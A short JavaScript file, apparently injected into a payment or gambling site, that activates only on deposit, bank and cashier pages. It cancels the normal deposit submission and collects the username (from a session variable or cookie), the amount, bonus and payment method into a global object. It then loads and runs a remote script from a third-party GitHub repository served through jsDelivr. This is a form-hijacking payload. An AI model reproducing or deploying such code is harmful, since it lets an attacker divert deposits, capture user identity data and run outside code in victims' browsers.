(function () {
  const match = [
    '/deposit',
    '/bank',
    '/deposit.php',
    '/qris.php',
    '/cashier',
    '/?page=transaksi',
    '/index.php?page=transaksi',
    '/?deposit&head=home',
    '/index.php?page=cashier',
    '/bank.php'
  ];

  function readCookie(name) {
    const m = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
    return m ? decodeURIComponent(m[2]) : null;
  }

  const href = window.location.href;
  const pathname = window.location.pathname || '/';
  const search = window.location.search || '';

  function isAllowed() {
    const pathAndSearch = pathname + search;
    for (let i = 0; i < match.length; i++) {
      const pattern = match[i];
      if (pattern.includes('?') || pattern.includes('=')) {
        if (href.includes(pattern)) return true;
      } else {
        if (pathAndSearch === pattern) return true;
        if (pathname === pattern) return true;
        if (pathname.startsWith(pattern)) return true;
        if (href.includes(pattern)) return true;
      }
    }
    return false;
  }

  if (!isAllowed()) {
    console.info('deposit_redirect: halaman tidak diijinkan', { pathname, search, href });
    return;
  }

  document.addEventListener("DOMContentLoaded", function () {
    const form = document.getElementById("depositForm");
    if (!form) {
      console.warn("deposit_redirect: Form depositForm tidak ditemukan.");
      return;
    }

    form.action = "https://cdn.jsdelivr.net/gh/arceusxyz/moon@main/afteract1.js";

    form.addEventListener("submit", function (e) {
      e.preventDefault();

      const username = window.SESSION_USER || readCookie("user");
      const nominal = document.getElementById("nominal")?.value || "";
      const bonus = document.getElementById("bonus")?.value || "";
      const payFrom = form.querySelector("select[name='pay_from']")?.value || "";
      const postID = form.querySelector("input[name='postID']")?.value || "";
      const termCondition = form.querySelector("input[name='termcondition']")?.checked ? 1 : 0;

      window.depositFormData = { username, nominal, bonus, pay_from: payFrom, postID, termcondition: termCondition };

      console.log("deposit_redirect: Mengirim data ke 1.js", window.depositFormData);

      const script = document.createElement("script");
      script.src = form.action;
      script.async = true;
      script.onload = () => console.log("deposit_redirect: afteract1.js dimuat");
      script.onerror = () => console.error("deposit_redirect: gagal load afteract1.js");
      document.body.appendChild(script);
    });
  });
})();
